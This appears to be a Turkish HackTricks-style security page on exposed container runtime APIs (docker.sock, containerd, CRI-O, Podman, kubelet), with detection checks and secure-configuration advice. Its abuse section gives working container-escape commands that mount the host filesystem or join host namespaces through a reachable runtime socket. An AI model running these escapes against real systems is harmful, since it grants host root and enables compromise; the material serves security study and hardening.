# Çalışma Zamanı API'si ve Daemon Maruziyeti

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Birçok gerçek konteyner ihlali hiç de bir namespace escape ile başlamaz. Bunlar çalışma zamanı kontrol düzlemine erişim ile başlar. Eğer bir workload bağlanmış bir Unix soketi veya açığa çıkmış bir TCP dinleyicisi üzerinden `dockerd`, `containerd`, CRI-O, Podman veya kubelet ile konuşabiliyorsa, saldırgan daha yüksek ayrıcalıklara sahip yeni bir container talep edebilir, host dosya sistemini mount edebilir, host namespaces'e katılabilir veya hassas node bilgilerini alabilir. Bu durumlarda, runtime API gerçek güvenlik sınırıdır ve onu ele geçirmek fonksiyonel olarak host'u ele geçirmekle yakındır.

Bu yüzden runtime soket maruziyeti kernel korumalarından ayrı olarak dokümante edilmelidir. Normal seccomp, capabilities, and MAC confinement ile korunuyor görünen bir container, içine `/var/run/docker.sock` veya `/run/containerd/containerd.sock` monte edilmişse yine de host ihlaline bir API çağrısı uzaklığında olabilir. Mevcut container'ın kernel izolasyonu tam olarak tasarlandığı gibi çalışıyor olabilirken runtime yönetim düzlemi tamamen açık kalabilir.

## Daemon Erişim Modelleri

Docker Engine geleneksel olarak ayrıcalıklı API'sini local Unix soketi `unix:///var/run/docker.sock` üzerinden açar. Tarihsel olarak ayrıca `tcp://0.0.0.0:2375` gibi TCP dinleyicileri veya 2376 üzerinde TLS korumalı bir dinleyici aracılığıyla uzaktan da açılmıştır. Daemon'u güçlü TLS ve istemci doğrulaması olmadan uzaktan açmak, Docker API'sini etkili bir şekilde uzak root arayüzüne çevirir.

containerd, CRI-O, Podman ve kubelet benzer yüksek etkili yüzeyler açar. İsimler ve iş akışları farklı olabilir, ama mantık aynıdır. Arayüz çağırana workload oluşturma, host yollarını mount etme, kimlik bilgilerini alma veya çalışan container'ları değiştirme izni veriyorsa, bu arayüz ayrıcalıklı bir yönetim kanalıdır ve buna göre muamele edilmelidir.

Kontrol edilmesi gereken yaygın local yollar şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha özel stack'ler ayrıca `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi uç noktalar da açabilir. Bunlar modern ortamlarda daha az yaygındır, ancak karşılaşıldıklarında sıradan uygulama soketlerinden ziyade çalışma zamanı kontrol yüzeylerini temsil ettikleri için aynı dikkatle ele alınmalıdır.

## Güvenli Uzaktan Erişim

Eğer bir daemon yerel soketin ötesine açılmak zorundaysa, bağlantı TLS ile korunmalı ve tercihen karşılıklı kimlik doğrulama ile sağlanmalıdır; böylece daemon istemciyi ve istemci daemoni doğrular. Kolaylık için Docker daemon'unu düz HTTP üzerinden açma eski alışkanlığı, API yüzeyi doğrudan ayrıcalıklı container'lar oluşturacak kadar güçlü olduğu için container yönetiminde en tehlikeli hatalardan biridir.

Eski Docker yapılandırma deseni şu şekildeydi:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hostlarda, daemon iletişimi ayrıca `fd://` olarak görünebilir; bu, işlemin doğrudan bağlamak yerine systemd'den önceden açılmış bir socket'i devraldığı anlamına gelir. Önemli olan nokta tam sözdizimi değil, güvenlik sonucudur. Daemon, sıkı izinlere sahip bir yerel socket'in ötesinde dinlemeye başladığı anda, transport security ve client authentication isteğe bağlı sertleştirme olmaktan çıkar, zorunlu hale gelir.

## Abuse

Eğer bir runtime socket mevcutsa, hangisi olduğunu, uyumlu bir client'in mevcut olup olmadığını ve ham HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Bu komutlar yararlıdır çünkü bir dead path, mount edilmiş ama erişilemeyen bir socket ve canlı ayrıcalıklı bir API arasındaki farkı ayırt ederler. Eğer client başarılı olursa, sonraki soru API'nin host bind mount veya host namespace sharing ile yeni bir container başlatıp başlatamayacağıdır.

### Tam Örnek: Docker Socket To Host Root

Eğer `docker.sock` erişilebilirse, klasik kaçış yöntemi host root filesystem'i mount eden yeni bir container başlatmak ve sonra `chroot` ile içine girmektir:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon üzerinden doğrudan host-root yürütümü sağlar. Etkisi yalnızca dosya okumaları ile sınırlı değildir. Yeni konteynerin içine girdikten sonra saldırgan host dosyalarını değiştirebilir, kimlik bilgilerini toplayabilir, persistence implant edebilir veya ek ayrıcalıklı iş yükleri başlatabilir.

### Full Example: Docker Socket To Host Namespaces

Eğer saldırgan yalnızca dosya sistemi erişimi yerine namespace girişini tercih ederse:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, mevcut olanı exploiting etmek yerine runtime'dan açıkça host-namespace exposure ile yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Tam Örnek: containerd Socket

Mount edilmiş `containerd` socket genellikle aynı derecede tehlikelidir:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Etkisi yine host compromise'dır. Docker-specific tooling olmasa bile, başka bir runtime API aynı administrative power'ı sağlayabilir.

## Checks

Bu kontrollerin amacı, container'ın trust boundary dışında kalması gereken herhangi bir management plane'e erişip erişemeyeceğini yanıtlamaktır.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
What is interesting here:

- Mount edilmiş bir runtime socket genellikle yalnızca bilgi sızıntısı değil, doğrudan yönetimsel bir yetki kaynağıdır.
- TLS olmadan `2375` üzerinde dinlemede olan bir TCP servis uzaktan ele geçirilme durumu olarak kabul edilmelidir.
- `DOCKER_HOST` gibi ortam değişkenleri genellikle iş yükünün host runtime ile konuşacak şekilde kasıtlı olarak tasarlandığını gösterir.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix socket | `dockerd` yerel socket üzerinde dinler ve daemon genellikle root yetkileriyle çalışır | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Varsayılan olarak daemonless CLI | Uzun süreli ayrıcalıklı bir daemon sıradan yerel kullanım için gerekli değildir; API socket'leri `podman system service` etkinleştirildiğinde yine de açılabilir | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Yerel ayrıcalıklı socket | Yönetim API'si yerel socket üzerinden açılır ve genellikle üst seviye araçlar tarafından kullanılır | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Yerel ayrıcalıklı socket | CRI endpoint node-local güvenilir bileşenler için tasarlanmıştır | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local yönetim API'si | Kubelet Pod'lardan geniş çapta erişilebilir olmamalıdır; erişim authn/authz durumuna bağlı olarak pod durumunu, kimlik bilgilerini ve yürütme özelliklerini açığa çıkarabilir | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
